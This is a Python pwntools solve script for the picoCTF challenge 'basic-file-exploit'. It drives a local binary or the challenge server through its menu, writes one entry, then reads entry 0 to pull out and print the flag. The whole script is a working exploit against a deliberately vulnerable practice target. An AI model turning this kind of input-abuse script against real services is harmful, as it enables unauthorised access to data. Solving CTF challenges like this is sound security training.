#!/usr/bin/env python3

from sys import argv
from pwn import *

BIN = './basic-file-exploit.bin'

IP = 'saturn.picoctf.net'
PORT = 53641


def open_instance():
    if 'remote' in argv:
        return remote(IP, PORT)
    return process(BIN)


p = open_instance()

# add phrase in database
p.readuntil(b'Type \'3\' to exit the program')
p.sendline(b'1')
p.readuntil(b'Please enter your data:')
p.sendline(b'AAAA')
p.readuntil(b'Please enter the length of your data:')
p.sendline(b'4')

# trigger entry 0
p.readuntil(b'Write successful, would you like to do anything else?')
p.sendline(b'2')
p.readuntil(b'Please enter the entry number of your data:')
p.sendline(b'0')

flag = p.recvall().strip()
print(flag.decode())
